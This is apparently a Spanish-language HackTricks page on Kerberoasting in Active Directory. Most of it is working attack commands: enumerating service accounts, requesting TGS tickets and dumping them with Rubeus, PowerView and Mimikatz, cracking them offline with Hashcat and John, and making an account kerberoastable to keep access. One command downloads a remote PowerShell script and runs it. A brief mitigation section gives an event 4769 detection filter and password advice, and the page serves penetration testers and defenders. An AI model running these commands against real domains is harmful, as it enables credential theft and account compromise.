# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting se centra en la adquisición de **TGS tickets**, específicamente aquellos relacionados con servicios que operan bajo **cuentas de usuario** en **Active Directory (AD)**, excluyendo **cuentas de computadora**. La encriptación de estos tickets utiliza claves que provienen de **contraseñas de usuario**, lo que permite la posibilidad de **cracking de credenciales offline**. El uso de una cuenta de usuario como servicio se indica por una propiedad **"ServicePrincipalName"** no vacía.

Para ejecutar **Kerberoasting**, es esencial una cuenta de dominio capaz de solicitar **TGS tickets**; sin embargo, este proceso no requiere **privilegios especiales**, lo que lo hace accesible para cualquier persona con **credenciales de dominio válidas**.

### Puntos Clave:

- **Kerberoasting** tiene como objetivo los **TGS tickets** para **servicios de cuentas de usuario** dentro de **AD**.
- Los tickets encriptados con claves de **contraseñas de usuario** pueden ser **crackeados offline**.
- Un servicio se identifica por un **ServicePrincipalName** que no es nulo.
- **No se necesitan privilegios especiales**, solo **credenciales de dominio válidas**.

### **Ataque**

> [!WARNING]
> Las **herramientas de Kerberoasting** típicamente solicitan **`RC4 encryption`** al realizar el ataque e iniciar solicitudes TGS-REQ. Esto se debe a que **RC4 es** [**más débil**](https://www.stigviewer.com/stig/windows_10/2017-04-28/finding/V-63795) y más fácil de crackear offline utilizando herramientas como Hashcat que otros algoritmos de encriptación como AES-128 y AES-256.\
> Los hashes de RC4 (tipo 23) comienzan con **`$krb5tgs$23$*`** mientras que los de AES-256 (tipo 18) comienzan con **`$krb5tgs$18$*`**.`

#### **Linux**
```bash
# Metasploit framework
msf> use auxiliary/gather/get_user_spns
# Impacket
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Password will be prompted
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
# kerberoast: https://github.com/skelsec/kerberoast
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerate kerberoastable users
kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Dump hashes
```
Herramientas multifuncionales que incluyen un volcado de usuarios kerberoastable:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
```
#### Windows

- **Enumerar usuarios susceptibles a Kerberoast**
```powershell
# Get Kerberoastable users
setspn.exe -Q */* #This is a built-in binary. Focus on user accounts
Get-NetUser -SPN | select serviceprincipalname #Powerview
.\Rubeus.exe kerberoast /stats
```
- **Técnica 1: Solicitar TGS y volcarlo de la memoria**
```powershell
#Get TGS in memory from a single user
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local

#Get TGSs for ALL kerberoastable accounts (PCs included, not really smart)
setspn.exe -T DOMAIN_NAME.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

#List kerberos tickets in memory
klist

# Extract them from memory
Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current folder

# Transform kirbi ticket to john
python2.7 kirbi2john.py sqldev.kirbi
# Transform john to hashcat
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```
- **Técnica 2: Herramientas automáticas**
```bash
# Powerview: Get Kerberoast hash of a user
Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
# Powerview: Get all Kerberoast hashes
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Specific user
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #Get of admins

# Invoke-Kerberoast
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```
> [!WARNING]
> Cuando se solicita un TGS, se genera el evento de Windows `4769 - Se solicitó un ticket de servicio Kerberos`.

### Cracking
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### Persistencia

Si tienes **suficientes permisos** sobre un usuario, puedes **hacerlo kerberoastable**:
```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
```
Puedes encontrar **herramientas** útiles para ataques de **kerberoast** aquí: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)

Si encuentras este **error** de Linux: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`** es por tu hora local, necesitas sincronizar el host con el DC. Hay algunas opciones:

- `ntpdate <IP del DC>` - Obsoleto a partir de Ubuntu 16.04
- `rdate -n <IP del DC>`

### Mitigación

El kerberoasting se puede llevar a cabo con un alto grado de sigilo si es explotable. Para detectar esta actividad, se debe prestar atención al **ID de Evento de Seguridad 4769**, que indica que se ha solicitado un ticket de Kerberos. Sin embargo, debido a la alta frecuencia de este evento, se deben aplicar filtros específicos para aislar actividades sospechosas:

- El nombre del servicio no debe ser **krbtgt**, ya que esta es una solicitud normal.
- Los nombres de servicio que terminan con **$** deben ser excluidos para evitar incluir cuentas de máquina utilizadas para servicios.
- Las solicitudes de máquinas deben ser filtradas excluyendo nombres de cuentas formateados como **machine@domain**.
- Solo se deben considerar las solicitudes de tickets exitosas, identificadas por un código de fallo de **'0x0'**.
- **Lo más importante**, el tipo de cifrado del ticket debe ser **0x17**, que a menudo se utiliza en ataques de Kerberoasting.
```bash
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
```
Para mitigar el riesgo de Kerberoasting:

- Asegúrese de que **las contraseñas de las cuentas de servicio sean difíciles de adivinar**, recomendando una longitud de más de **25 caracteres**.
- Utilice **Cuentas de Servicio Administradas**, que ofrecen beneficios como **cambios automáticos de contraseña** y **gestión delegada del Nombre Principal de Servicio (SPN)**, mejorando la seguridad contra tales ataques.

Al implementar estas medidas, las organizaciones pueden reducir significativamente el riesgo asociado con Kerberoasting.

## Kerberoast sin cuenta de dominio

En **septiembre de 2022**, un nuevo método para explotar un sistema fue revelado por un investigador llamado Charlie Clark, compartido a través de su plataforma [exploit.ph](https://exploit.ph/). Este método permite la adquisición de **Tickets de Servicio (ST)** a través de una solicitud **KRB_AS_REQ**, que notablemente no requiere control sobre ninguna cuenta de Active Directory. Esencialmente, si un principal está configurado de tal manera que no requiere pre-autenticación—un escenario similar a lo que se conoce en el ámbito de la ciberseguridad como un **ataque AS-REP Roasting**—esta característica puede ser aprovechada para manipular el proceso de solicitud. Específicamente, al alterar el atributo **sname** dentro del cuerpo de la solicitud, el sistema es engañado para emitir un **ST** en lugar del estándar Ticket Granting Ticket (TGT) encriptado.

La técnica se explica completamente en este artículo: [Semperis blog post](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).

> [!WARNING]
> Debe proporcionar una lista de usuarios porque no tenemos una cuenta válida para consultar el LDAP utilizando esta técnica.

#### Linux

- [impacket/GetUserSPNs.py from PR #1413](https://github.com/fortra/impacket/pull/1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
```
#### Windows

- [GhostPack/Rubeus from PR #139](https://github.com/GhostPack/Rubeus/pull/139):
```bash
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
```
## Referencias

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)

{{#include ../../banners/hacktricks-training.md}}
